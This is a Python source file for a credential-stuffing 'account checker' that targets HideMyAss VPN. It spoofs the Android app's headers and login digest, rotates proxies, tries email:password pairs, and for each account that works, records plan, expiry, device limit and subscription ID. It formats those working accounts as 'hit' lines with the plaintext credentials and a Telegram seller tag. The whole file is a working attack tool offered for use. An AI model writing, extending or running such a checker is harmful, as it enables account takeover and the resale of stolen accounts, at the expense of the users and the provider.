class HMAVPNChecker:
    """HideMyAss / HMA VPN account checker (sync, embedded)."""
    def __init__(self, proxy=None, timeout=25):
        self.proxy = proxy
        self.timeout = timeout or 25

    def _digest(self, app_id, email, password):
        raw = f"{_HMA_APP_SECRET}{app_id}{email}:{password}".encode()
        return base64.b64encode(hashlib.sha256(raw).digest()).decode()

    def _ts_info(self, ms_or_s):
        if not ms_or_s:
            return "N/A", 0, "UNKNOWN"
        try:
            v = float(ms_or_s)
        except Exception:
            return "N/A", 0, "UNKNOWN"
        if v <= 0:
            return "N/A", 0, "UNKNOWN"
        if v > 1e12:
            seconds = v / 1000.0
        elif v > 1e9:
            seconds = v
        else:
            seconds = v
        try:
            dt = datetime.utcfromtimestamp(seconds)
        except Exception:
            return "N/A", 0, "UNKNOWN"
        delta = (dt - datetime.utcnow()).days
        return dt.strftime("%Y-%m-%d"), max(delta, 0), ("YES" if delta < 0 else "NO")

    def check(self, email, password, proxy=None):
        proxy = proxy or self.proxy
        try:
            session = _curl_session("chrome131_android")
        except Exception:
            session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        app_id = str(uuid.uuid4())
        digest = self._digest(app_id, email, password)
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Ktor client",
            "Accept": "application/json",
            "X-Avast-App-Build": _HMA_APP_BUILD,
            "X-Avast-App-Package": _HMA_APP_PACKAGE,
            "X-Avast-App-Brand": "PRIVAX",
            "X-Avast-App-Mode": "PAID",
            "X-Avast-Device-Platform": "ANDROID",
        }
        payload = {
            "email": email,
            "password": password,
            "appId": app_id,
            "digest": digest,
            "deviceId": "".join(random.choices(string.hexdigits.lower(), k=16)),
        }
        try:
            r = session.post(_HMA_LOGIN_URL, headers=headers, json=payload, timeout=self.timeout)
        except Exception as e:
            return {"status": "error", "message": f"login_net: {str(e)[:60]}"}
        if r.status_code in (401, 403):
            return {"status": "bad", "message": "Invalid credentials"}
        if r.status_code != 200:
            return {"status": "error", "message": f"HTTP {r.status_code}"}
        try:
            data = r.json()
        except Exception:
            return {"status": "error", "message": "invalid_json"}
        # tickets / tokens
        lic_ticket = data.get("licenseTicket") or data.get("licTicket") or data.get("ticket") or ""
        dev_ticket = data.get("deviceTicket") or data.get("devTicket") or ""
        user = data.get("user") or data.get("account") or {}
        if not isinstance(user, dict):
            user = {}
        verified = user.get("verified") or user.get("emailVerified") or data.get("verified")
        username = user.get("username") or user.get("name") or ""
        uid = user.get("uuid") or user.get("id") or ""
        # licenses
        plan = "N/A"
        product_id = "N/A"
        maximum = "N/A"
        overused = "N/A"
        expires_iso = "N/A"
        days_left = 0
        expired = "UNKNOWN"
        payment = "N/A"
        sub_id = "N/A"
        lic_count = 0
        try:
            lh = dict(headers)
            if lic_ticket:
                lh["Authorization"] = f"Bearer {lic_ticket}"
            elif dev_ticket:
                lh["Authorization"] = f"Bearer {dev_ticket}"
            lr = session.post(_HMA_LICENSES_URL, headers=lh, json={}, timeout=self.timeout)
            if lr.status_code == 200:
                lj = lr.json()
                lics = lj if isinstance(lj, list) else (lj.get("licenses") or lj.get("data") or [])
                if isinstance(lics, list) and lics:
                    lic_count = len(lics)
                    lic = lics[0] if isinstance(lics[0], dict) else {}
                    product = lic.get("product") or {}
                    if not isinstance(product, dict):
                        product = {}
                    usage = lic.get("licenseUsage") or {}
                    if not isinstance(usage, dict):
                        usage = {}
                    sale = lic.get("saleChannel") or {}
                    if not isinstance(sale, dict):
                        sale = {}
                    plan = product.get("name") or lic.get("name") or "N/A"
                    product_id = product.get("id") or "N/A"
                    maximum = usage.get("maximum") or "N/A"
                    overused = str(lic.get("overused", "N/A"))
                    exp_raw = lic.get("expires") or lic.get("expiry")
                    expires_iso, days_left, expired = self._ts_info(exp_raw)
                    payment = sale.get("id") or "N/A"
                    sub_id = str(lic.get("subscriptionId") or lic.get("id") or "N/A")
        except Exception:
            pass

        if verified is False or str(verified).lower() in ("false", "0"):
            status = "free"
            msg = "Not verified"
        elif expired == "YES" or (days_left == 0 and expires_iso != "N/A"):
            status = "free"
            msg = "Expired / free"
        elif plan not in ("N/A", "", None) and expired == "NO":
            status = "premium"
            msg = f"Plan: {plan} | Days: {days_left}"
        elif lic_count > 0 and expired == "NO":
            status = "premium"
            msg = f"Plan: {plan}"
        elif lic_ticket or dev_ticket:
            # logged in but no paid lic
            status = "free"
            msg = "Valid login, no active paid license"
        else:
            status = "bad"
            msg = "Login failed"

        zip_line = (
            f"{email}:{password} | Plan = {plan} | ProductID = {product_id} | "
            f"MaxDevices = {maximum} | Overused = {overused} | Expires = {expires_iso} | "
            f"DaysLeft = {days_left} | Payment = {payment} | SubID = {sub_id} | "
            f"Verified = {verified} | UID = {uid} | by TG: @samviir"
        )
        return {
            "status": status,
            "message": msg,
            "plan": plan,
            "country": "",
            "email": email,
            "password": password,
            "zip_line": zip_line,
            "hit_text": zip_line,
            "hit_line": zip_line,
        }


